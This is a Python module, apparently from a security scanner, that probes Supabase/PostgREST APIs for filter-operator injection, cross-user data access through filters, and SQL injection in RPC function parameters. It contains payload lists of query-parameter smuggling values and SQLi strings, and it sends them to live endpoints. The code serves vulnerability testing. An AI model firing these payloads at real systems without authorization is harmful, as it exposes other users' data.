"""
SupaHunt — PostgREST Filter Injection Tester
Tests for operator injection via query parameters.
Based on real-world findings where cursor/search params were injectable.

PostgREST filter syntax: ?column=operator.value
Injection vectors: user-controlled values passed directly to PostgREST queries
can inject operators like .is.null, .or.(), .not.is.null to bypass filtering.
"""

import json
import secrets
from typing import Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from .base import BaseModule


class FilterInjectionResult:
    """Result of a filter injection test on a table/column."""

    def __init__(self, table: str, param: str, vector: str):
        self.table = table
        self.param = param
        self.vector = vector
        self.vulnerable = False
        self.baseline_count = 0
        self.injected_count = 0
        self.extra_records = 0
        self.error = ""
        self.evidence = ""

    @property
    def severity(self) -> str:
        if self.vulnerable and self.extra_records > 100:
            return "HIGH"
        if self.vulnerable:
            return "MEDIUM"
        return "INFO"

    def to_dict(self) -> dict:
        return {
            "table": self.table,
            "param": self.param,
            "vector": self.vector,
            "vulnerable": self.vulnerable,
            "severity": self.severity,
            "baseline_count": self.baseline_count,
            "injected_count": self.injected_count,
            "extra_records": self.extra_records,
            "evidence": self.evidence,
        }


# PostgREST filter injection vectors
INJECTION_VECTORS = [
    # Operator injection — escape value context into filter operator
    {
        "name": "is.null bypass",
        "param_value": "anything.or.(id.not.is.null)",
        "description": "Injects OR condition to return all rows",
    },
    {
        "name": "or() injection",
        "param_value": "x]&or=(id.not.is.null)&x=[y",
        "description": "Breaks out of value into OR filter",
    },
    {
        "name": "select injection",
        "param_value": "x&select=*,id&x=y",
        "description": "Injects additional select columns",
    },
    {
        "name": "order injection",
        "param_value": "x&order=id.asc&x=y",
        "description": "Injects ordering to enumerate",
    },
    {
        "name": "limit bypass",
        "param_value": "x&limit=10000&x=y",
        "description": "Bypasses pagination limits",
    },
    {
        "name": "offset injection",
        "param_value": "x&offset=0&limit=10000&x=y",
        "description": "Resets offset for data enumeration",
    },
    {
        "name": "not.is.null universal",
        "param_value": "not.is.null",
        "description": "Direct operator injection returning all non-null rows",
    },
    {
        "name": "ilike wildcard",
        "param_value": "ilike.*",
        "description": "Wildcard ILIKE matching all rows",
    },
    {
        "name": "gt.0 bypass",
        "param_value": "gt.0",
        "description": "Greater-than-zero matches most numeric rows",
    },
    {
        "name": "neq null",
        "param_value": "neq.null",
        "description": "Not-equal to null returns everything",
    },
]

# Common filterable parameter names
COMMON_FILTER_PARAMS = [
    "cursor", "search", "q", "query", "filter", "category",
    "status", "type", "sort", "order", "page", "after",
    "before", "start", "end", "from", "to", "id", "name",
    "user_id", "offset", "limit", "genre", "tag",
]


class FilterInjectionTester(BaseModule):
    """
    Tests PostgREST endpoints for filter/operator injection.

    Strategy:
    1. For each table, get baseline record count
    2. Inject PostgREST operators via various query param patterns
    3. Compare result count — if higher than baseline, injection succeeded
    4. Test both direct table access and common app-level filter params
    """

    def __init__(self, target, console=None, timeout: int = 15,
                 proxy: str = None, threads: int = 5, **kwargs):
        super().__init__(target, console=console, timeout=timeout,
                         proxy=proxy, **kwargs)
        self.threads = threads

    # ──── Baseline ────

    def _get_record_count(self, table: str, token: str = None,
                          extra_params: str = "") -> Optional[int]:
        """Get record count from Content-Range header."""
        url = f"{self.rest_url(table)}?select=id&limit=0{extra_params}"
        headers = self._headers(token)
        headers["Prefer"] = "count=exact"
        headers["Range"] = "0-0"

        r = self._request("GET", url, headers=headers)
        if r is None or r.status_code not in (200, 206, 416):
            return None

        cr = r.headers.get("Content-Range", "")
        if "/" in cr:
            try:
                return int(cr.split("/")[1])
            except (ValueError, IndexError):
                pass
        return None

    def _get_response_count(self, table: str, params: str,
                            token: str = None) -> Optional[int]:
        """Get number of records returned by a query."""
        url = f"{self.rest_url(table)}?select=id&limit=10000{params}"
        r = self.get(url, token=token)
        if r is None or r.status_code != 200:
            return None
        try:
            data = r.json()
            return len(data) if isinstance(data, list) else None
        except Exception:
            return None

    # ──── Direct PostgREST Injection ────

    def test_table_injection(self, table: str, columns: list = None,
                             token: str = None) -> list:
        """
        Test a single table for PostgREST filter injection.
        Tries injecting operators on known columns.
        """
        results = []

        # Get baseline
        baseline = self._get_record_count(table, token)
        if baseline is None or baseline == 0:
            return results

        # If no columns known, try common ones
        if not columns:
            columns = ["id", "name", "status", "type", "user_id", "email",
                       "created_at", "title", "slug"]

        for col in columns:
            for vector in INJECTION_VECTORS:
                result = FilterInjectionResult(table, col, vector["name"])
                result.baseline_count = baseline

                param = f"&{col}={vector['param_value']}"
                injected = self._get_response_count(table, param, token)

                if injected is not None and injected > baseline:
                    result.vulnerable = True
                    result.injected_count = injected
                    result.extra_records = injected - baseline
                    result.evidence = (
                        f"Baseline: {baseline} rows, "
                        f"Injected: {injected} rows (+{result.extra_records})"
                    )
                    results.append(result)
                    self.log_critical(
                        f"Filter injection: {table}.{col} via {vector['name']} "
                        f"(+{result.extra_records} rows)"
                    )
                elif injected is not None:
                    result.injected_count = injected

        return results

    # ──── App-Level API Route Injection ────

    def test_api_route_injection(self, base_url: str,
                                 params: list = None) -> list:
        """
        Test app-level API routes (e.g., /api/movies?search=X) for
        PostgREST filter injection via query parameters.
        """
        results = []
        test_params = params or COMMON_FILTER_PARAMS

        for param in test_params:
            # Baseline request with normal value
            baseline_url = f"{base_url}?{param}=normal_test_value"
            r_baseline = self.get(baseline_url, headers={
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json",
            })

            if r_baseline is None or r_baseline.status_code != 200:
                continue

            try:
                baseline_data = r_baseline.json()
                if isinstance(baseline_data, dict):
                    baseline_count = len(baseline_data.get("data", baseline_data.get("results", [])))
                elif isinstance(baseline_data, list):
                    baseline_count = len(baseline_data)
                else:
                    continue
            except Exception:
                continue

            # Test injection vectors
            for vector in INJECTION_VECTORS[:5]:  # Top 5 most common
                injected_url = f"{base_url}?{param}={vector['param_value']}"
                r_inject = self.get(injected_url, headers={
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "application/json",
                })

                if r_inject is None or r_inject.status_code != 200:
                    continue

                try:
                    inject_data = r_inject.json()
                    if isinstance(inject_data, dict):
                        inject_count = len(inject_data.get("data", inject_data.get("results", [])))
                    elif isinstance(inject_data, list):
                        inject_count = len(inject_data)
                    else:
                        continue
                except Exception:
                    continue

                if inject_count > baseline_count:
                    result = FilterInjectionResult("api_route", param, vector["name"])
                    result.vulnerable = True
                    result.baseline_count = baseline_count
                    result.injected_count = inject_count
                    result.extra_records = inject_count - baseline_count
                    result.evidence = (
                        f"Route: {base_url}?{param}=...\n"
                        f"Baseline: {baseline_count}, Injected: {inject_count}"
                    )
                    results.append(result)
                    self.log_critical(
                        f"API injection: {param} via {vector['name']} "
                        f"(+{result.extra_records} records)"
                    )

        return results

    # ──── Batch Testing ────

    def test_all_tables(self, tables: list, token: str = None) -> list:
        """
        Test multiple tables for filter injection.
        tables: list of TableInfo objects or dicts with 'name' and 'columns'.
        """
        all_results = []

        self.log_info(f"Testing {len(tables)} tables for filter injection...")

        for t in tables:
            if isinstance(t, dict):
                name = t.get("name", "")
                cols = t.get("columns", [])
            else:
                name = t.name
                cols = getattr(t, "columns", [])

            if not name:
                continue

            results = self.test_table_injection(name, cols, token)
            all_results.extend(results)

        # Summary
        vuln_count = sum(1 for r in all_results if r.vulnerable)
        if vuln_count:
            self.log_critical(f"Found {vuln_count} filter injection points!")
        else:
            self.log_success("No filter injection found.")

        return all_results

    # ──── Horizontal Privilege Escalation via Filter ────

    def test_idor_via_filter(self, table: str, user_id: str,
                             token: str = None) -> dict:
        """
        Test if PostgREST filters can be bypassed to access other users' data.
        Compares: ?user_id=eq.{own_id} vs ?user_id=neq.{own_id}
        """
        results = {"table": table, "vulnerable": False}

        # Own data
        own_url = f"{self.rest_url(table)}?user_id=eq.{user_id}&select=id&limit=5"
        r_own = self.get(own_url, token=token)

        if r_own is None or r_own.status_code != 200:
            return results

        try:
            own_count = len(r_own.json())
        except Exception:
            return results

        # Other users' data
        other_url = f"{self.rest_url(table)}?user_id=neq.{user_id}&select=id&limit=5"
        r_other = self.get(other_url, token=token)

        if r_other and r_other.status_code == 200:
            try:
                other_count = len(r_other.json())
                if other_count > 0:
                    results["vulnerable"] = True
                    results["own_records"] = own_count
                    results["other_records"] = other_count
                    results["evidence"] = (
                        f"Own records: {own_count}, "
                        f"Other users' records accessible: {other_count}"
                    )
                    self.log_critical(
                        f"IDOR: {table} — can access {other_count} "
                        f"other users' records"
                    )
            except Exception:
                pass

        return results

    # ──── RPC Parameter Injection ────

    def test_rpc_param_injection(self, function_name: str,
                                 param_name: str,
                                 token: str = None) -> dict:
        """
        Test if RPC function parameters are vulnerable to SQL injection
        via PostgREST JSON body.
        """
        results = {"function": function_name, "param": param_name, "vulnerable": False}

        # Test vectors for RPC params
        sqli_vectors = [
            ("tautology", "' OR '1'='1"),
            ("union_select", "' UNION SELECT null--"),
            ("stacked", "'; SELECT pg_sleep(0)--"),
            ("error_based", "' AND 1=CAST((SELECT version()) AS int)--"),
        ]

        for name, payload in sqli_vectors:
            r = self.post(
                self.rpc_url(function_name),
                token=token,
                json_data={param_name: payload},
            )

            if r is None:
                continue

            # Check for SQL error disclosure
            if r.status_code in (200, 500):
                text = r.text.lower()
                sql_indicators = [
                    "syntax error", "unterminated", "pg_", "postgresql",
                    "column", "relation", "operator", "select",
                    "invalid input syntax",
                ]
                for indicator in sql_indicators:
                    if indicator in text:
                        results["vulnerable"] = True
                        results["vector"] = name
                        results["evidence"] = r.text[:500]
                        self.log_critical(
                            f"RPC SQLi: {function_name}({param_name}) "
                            f"via {name}"
                        )
                        return results

        return results
